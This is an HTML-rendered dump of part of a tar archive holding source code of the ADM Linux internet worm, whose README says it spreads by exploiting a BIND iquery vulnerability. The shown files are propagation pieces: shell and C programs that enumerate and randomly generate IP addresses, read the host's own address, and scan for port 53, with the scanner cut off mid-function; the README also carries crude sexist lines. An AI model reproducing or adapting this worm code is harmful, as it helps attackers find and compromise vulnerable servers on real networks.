<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Linux.Adm - Net-Worm.Linux.Adm.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc12 {
}
.sc14 {
	font-weight: bold;
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">40755</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">           </span><span class="sc4">0</span><span class="sc0">  </span><span class="sc4">6527421333</span><span class="sc0">   </span><span class="sc4">7732</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">incremental</span><span class="sc0"></span><span class="sc4">100755</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">        </span><span class="sc4">1375</span><span class="sc0">  </span><span class="sc4">6526157272</span><span class="sc0">  </span><span class="sc4">12273</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0">#</span><span class="sc10">!</span><span class="sc14">/bin/sh</span><span class="sc0">
</span><span class="sc11">declare</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc11">A</span><span class="sc0">
</span><span class="sc11">declare</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc11">B</span><span class="sc0">
</span><span class="sc11">declare</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc11">C</span><span class="sc0">
</span><span class="sc11">declare</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc11">D</span><span class="sc0">

</span><span class="sc11">read</span><span class="sc0"> </span><span class="sc11">ARGV</span><span class="sc0">

</span><span class="sc11">A</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$ARGV</span><span class="sc10">|</span><span class="sc11">cut</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">f</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc0">`
</span><span class="sc11">B</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$ARGV</span><span class="sc10">|</span><span class="sc11">cut</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">f</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0">`
</span><span class="sc11">C</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$ARGV</span><span class="sc10">|</span><span class="sc11">cut</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">f</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc0">`
</span><span class="sc11">D</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$ARGV</span><span class="sc10">|</span><span class="sc11">cut</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">d</span><span class="sc10">.</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">f</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc0">`

        </span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"$A.$B.$C.$D"</span><span class="sc0">


</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc0"> 
</span><span class="sc5">do</span><span class="sc0"> 

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0">  </span><span class="sc6">"$A"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">ge</span><span class="sc0"> </span><span class="sc6">"229"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
</span><span class="sc11">then</span><span class="sc0">
  </span><span class="sc11">A</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc0">
</span><span class="sc11">fi</span><span class="sc0">

</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc6">"$A"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">lt</span><span class="sc0"> </span><span class="sc6">"230"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
</span><span class="sc5">do</span><span class="sc0"> 
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc6">"$B"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">ge</span><span class="sc0"> </span><span class="sc6">"229"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
        </span><span class="sc11">then</span><span class="sc0">
        </span><span class="sc11">B</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc0">
        </span><span class="sc11">fi</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc6">"$B"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">lt</span><span class="sc0"> </span><span class="sc6">"230"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
    </span><span class="sc5">do</span><span class="sc0"> 

         </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0">  </span><span class="sc6">"$C"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">ge</span><span class="sc0"> </span><span class="sc6">"229"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
         </span><span class="sc11">then</span><span class="sc0">
             </span><span class="sc11">C</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc0">
             </span><span class="sc11">fi</span><span class="sc0">
        
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc6">"$C"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">lt</span><span class="sc0"> </span><span class="sc6">"230"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
            </span><span class="sc5">do</span><span class="sc0"> 

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0">  </span><span class="sc6">"$D"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">ge</span><span class="sc0"> </span><span class="sc6">"229"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
                    </span><span class="sc11">then</span><span class="sc0">
                    </span><span class="sc11">D</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc0">
                 </span><span class="sc11">fi</span><span class="sc0">

            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc6">"$D"</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">lt</span><span class="sc0"> </span><span class="sc6">"230"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
            </span><span class="sc5">do</span><span class="sc0">
       
                  </span><span class="sc11">D</span><span class="sc10">=</span><span class="sc11">D</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc0">
                  </span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc6">"$A.$B.$C.$D"</span><span class="sc0">
                </span><span class="sc11">done</span><span class="sc0">
             </span><span class="sc11">C</span><span class="sc10">=</span><span class="sc11">C</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc0">
            </span><span class="sc11">done</span><span class="sc0">
         </span><span class="sc11">B</span><span class="sc10">=</span><span class="sc11">B</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc0"> 
     </span><span class="sc11">done</span><span class="sc0"> 
 </span><span class="sc11">A</span><span class="sc10">=</span><span class="sc11">A</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc0"> 

</span><span class="sc11">done</span><span class="sc0">

   </span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">gimmeIP</span><span class="sc0"></span><span class="sc4">100755</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">        </span><span class="sc4">1041</span><span class="sc0">  </span><span class="sc4">6525360155</span><span class="sc0">  </span><span class="sc4">11302</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0">#</span><span class="sc10">!</span><span class="sc14">/bin/sh</span><span class="sc0">
</span><span class="sc11">PATH</span><span class="sc10">=</span><span class="sc6">"/usr/bin:/bin:/usr/local/bin/:/usr/sbin/:/sbin"</span><span class="sc0">
</span><span class="sc11">export</span><span class="sc0"> </span><span class="sc11">PATH</span><span class="sc0">

</span><span class="sc11">route</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc11">A</span><span class="sc0">
</span><span class="sc5">do</span><span class="sc0">

</span><span class="sc11">GW</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$A</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">awk</span><span class="sc0"> </span><span class="sc7">'{printf("%s",$1)}'</span><span class="sc0">`

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc11">$GW</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"0.0.0.0"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
</span><span class="sc11">then</span><span class="sc0"> 

</span><span class="sc11">IFACE</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$A</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">awk</span><span class="sc0"> </span><span class="sc7">'{printf("%s",$8)}'</span><span class="sc0">`

</span><span class="sc11">ifconfig</span><span class="sc0"> </span><span class="sc11">$IFACE</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc11">B</span><span class="sc0"> 
     </span><span class="sc5">do</span><span class="sc0">
      </span><span class="sc11">CMP</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$B</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">awk</span><span class="sc0"> </span><span class="sc7">'{printf("%s",$1)}'</span><span class="sc0">`    
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">[</span><span class="sc0"> </span><span class="sc11">$CMP</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"inet"</span><span class="sc0"> </span><span class="sc10">]</span><span class="sc0">
         </span><span class="sc11">then</span><span class="sc0">
         </span><span class="sc11">MYIP</span><span class="sc10">=</span><span class="sc0">`</span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$B</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">cut</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">d</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc11">f</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">awk</span><span class="sc0"> </span><span class="sc7">'{printf("%s",$1)}'</span><span class="sc0">`
        </span><span class="sc9"># echo "my default iface is $IFACE and my ip is $MYIP"
</span><span class="sc0">         </span><span class="sc11">echo</span><span class="sc0"> </span><span class="sc11">$MYIP</span><span class="sc0">
         </span><span class="sc11">exit</span><span class="sc0">
      </span><span class="sc11">fi</span><span class="sc0">    
   </span><span class="sc11">done</span><span class="sc0">
    
</span><span class="sc11">fi</span><span class="sc0">
</span><span class="sc11">done</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">README</span><span class="sc0"></span><span class="sc4">100644</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">        </span><span class="sc4">1463</span><span class="sc0">  </span><span class="sc4">6527421333</span><span class="sc0">  </span><span class="sc4">10713</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0">
                      </span><span class="sc11">___</span><span class="sc0">      </span><span class="sc11">______</span><span class="sc0">      </span><span class="sc11">_</span><span class="sc0">       </span><span class="sc11">_</span><span class="sc0">
                    </span><span class="sc10">/</span><span class="sc0">     \   </span><span class="sc10">|</span><span class="sc0">   </span><span class="sc11">_</span><span class="sc0">   \   </span><span class="sc10">|</span><span class="sc0">  \   </span><span class="sc14">/  |
</span><span class="sc0">                   </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc14">/ \  |  |  |  \  |  |   \_/</span><span class="sc0">   </span><span class="sc10">|</span><span class="sc0">
                   </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc11">___</span><span class="sc10">|</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc11">_</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc0">   \</span><span class="sc11">_</span><span class="sc10">/</span><span class="sc0">   </span><span class="sc10">|</span><span class="sc0">
</span><span class="sc10">..</span><span class="sc11">oO</span><span class="sc0">  </span><span class="sc11">THE</span><span class="sc0">          </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">---</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc0">  </span><span class="sc10">|</span><span class="sc0">       </span><span class="sc14">/   |  |   |  |         CreW Oo..
</span><span class="sc0">                   </span><span class="sc7">'''   '''</span><span class="sc0">   </span><span class="sc7">'''''''    ''''   '''</span><span class="sc12">'        
</span><span class="sc0">                               </span><span class="sc11">presents</span><span class="sc0">

</span><span class="sc11">the</span><span class="sc0"> </span><span class="sc11">adm</span><span class="sc0"> </span><span class="sc11">inet</span><span class="sc0"> </span><span class="sc11">w0rm</span><span class="sc10">...</span><span class="sc0">

</span><span class="sc11">the</span><span class="sc0"> </span><span class="sc11">w0rm</span><span class="sc0"> </span><span class="sc11">is</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc11">linux</span><span class="sc10">/</span><span class="sc11">x86</span><span class="sc0"> </span><span class="sc11">spef</span><span class="sc0"> </span><span class="sc11">he</span><span class="sc0"> </span><span class="sc11">exploit</span><span class="sc0"> </span><span class="sc11">the</span><span class="sc0">  </span><span class="sc11">bind</span><span class="sc10">/</span><span class="sc11">iquery</span><span class="sc0"> </span><span class="sc11">vuln</span><span class="sc0">

</span><span class="sc11">no</span><span class="sc0"> </span><span class="sc11">help</span><span class="sc0"> </span><span class="sc11">allowed</span><span class="sc0"> </span><span class="sc11">just</span><span class="sc0"> </span><span class="sc11">look</span><span class="sc0">   </span><span class="sc11">ADMw0rm</span><span class="sc0"> </span><span class="sc11">and</span><span class="sc0"> </span><span class="sc11">startup</span><span class="sc0"> </span><span class="sc10">....</span><span class="sc0">

</span><span class="sc11">take</span><span class="sc0"> </span><span class="sc11">care</span><span class="sc0"> </span><span class="sc11">about</span><span class="sc0"> </span><span class="sc11">one</span><span class="sc0">  </span><span class="sc11">things</span><span class="sc10">!!!</span><span class="sc0"> </span><span class="sc11">dont</span><span class="sc0"> </span><span class="sc11">launch</span><span class="sc0">  </span><span class="sc11">the</span><span class="sc0"> </span><span class="sc11">w0rm</span><span class="sc0"> </span><span class="sc11">on</span><span class="sc0"> </span><span class="sc11">your</span><span class="sc0"> </span><span class="sc11">box</span><span class="sc0">
</span><span class="sc11">cuz</span><span class="sc0">  </span><span class="sc11">he</span><span class="sc0"> </span><span class="sc11">create</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc11">big</span><span class="sc0">  </span><span class="sc11">security</span><span class="sc0"> </span><span class="sc11">problem</span><span class="sc10">....</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc11">p</span><span class="sc0"> 
</span><span class="sc11">it</span><span class="sc12">'s just for educational purpose of coursseeeeeeeeeeee
</span><span class="sc0">

</span><span class="sc11">Cyaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="sc0">


</span><span class="sc11">Sweden</span><span class="sc0">  </span><span class="sc11">chix</span><span class="sc0"> </span><span class="sc11">has</span><span class="sc0"> </span><span class="sc11">born</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc0">  </span><span class="sc11">be</span><span class="sc0"> </span><span class="sc11">fuck</span><span class="sc0">

  </span><span class="sc10">--</span><span class="sc4">3xF</span><span class="sc10">--</span><span class="sc0">
</span><span class="sc11">find</span><span class="sc0">   </span><span class="sc12">'em
</span><span class="sc11">fuck</span><span class="sc0">   </span><span class="sc12">'em
</span><span class="sc11">forget</span><span class="sc0"> </span><span class="sc12">'em
</span><span class="sc0">  </span><span class="sc10">--</span><span class="sc4">3xF</span><span class="sc10">--</span><span class="sc0">
</span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">gimmeRAND</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0"></span><span class="sc4">100644</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">         </span><span class="sc4">472</span><span class="sc0">  </span><span class="sc4">6526322173</span><span class="sc0">  </span><span class="sc4">11722</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0"> #</span><span class="sc11">include</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc11">stdio</span><span class="sc10">.</span><span class="sc11">h</span><span class="sc10">&gt;</span><span class="sc0">
 </span><span class="sc9">#include &lt;time.h&gt;       
</span><span class="sc0"> </span><span class="sc9">#include &lt;stdlib.h&gt;
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">myrand</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">230.0</span><span class="sc10">*</span><span class="sc11">rand</span><span class="sc10">()/(</span><span class="sc11">RAND_MAX</span><span class="sc10">+</span><span class="sc4">1.0</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">);</span><span class="sc0">
 </span><span class="sc10">}</span><span class="sc0">
    
 </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc0">  </span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  
 </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
 
 </span><span class="sc11">srand</span><span class="sc10">((</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">)*</span><span class="sc11">rand</span><span class="sc10">()));</span><span class="sc0">

 </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%i."</span><span class="sc10">,</span><span class="sc11">myrand</span><span class="sc10">());</span><span class="sc0">
 
 </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%i\n"</span><span class="sc10">,</span><span class="sc11">myrand</span><span class="sc10">());</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
 

         
</span><span class="sc11">w0rm</span><span class="sc10">/</span><span class="sc11">scanconnect</span><span class="sc10">.</span><span class="sc11">c</span><span class="sc0"></span><span class="sc4">100644</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">      </span><span class="sc4">0</span><span class="sc0">        </span><span class="sc4">2713</span><span class="sc0">  </span><span class="sc4">6526321416</span><span class="sc0">  </span><span class="sc4">12474</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"></span><span class="sc11">ustar</span><span class="sc0">  </span><span class="sc11">root</span><span class="sc0"></span><span class="sc11">root</span><span class="sc0"></span><span class="sc1">/*
scannconect scan for the port 53 
read the host from the stdin
the code come at 90% from a imap checker proggie
anyway it's come from ADM too hehe =) 
*/</span><span class="sc0">

</span><span class="sc9">#define PROJECT          "ADM internet w0rm project"
</span><span class="sc0">
</span><span class="sc9">#define MAXCHILD        20
</span><span class="sc0">
</span><span class="sc9">#define CONNECT_TIMEOUT     10
</span><span class="sc0">
</span><span class="sc9">#define PORT                53
</span><span class="sc0">
</span><span class="sc9">#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;signal.h&gt;
#include &lt;string.h&gt;
#include &lt;malloc.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
</span><span class="sc0">
</span><span class="sc11">pid_t</span><span class="sc0"> </span><span class="sc11">wait</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">status</span><span class="sc10">);</span><span class="sc0">
       
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sock</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">flowbuf</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">connect_read_timeout</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">checkout</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">sa</span><span class="sc10">;</span><span class="sc0">      


    </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">sa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sa</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">sa</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0"> 
    </span><span class="sc11">sa</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">PORT</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">sock</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IPPROTO_TCP</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">signal</span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">connect_read_timeout</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc11">CONNECT_TIMEOUT</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">sa</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">sa</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">sock</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">alarm</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc11">inet_ntoa</span><span class="sc10">(</span><span class="sc11">ip</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ipS</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">in_addr</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">childs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fgets</span><span class="sc10">(</span><span class="sc11">ipS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ipS</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">stdin</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">inet_aton</span><span class="sc10">(</span><span class="sc11">ipS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ip</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ip</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
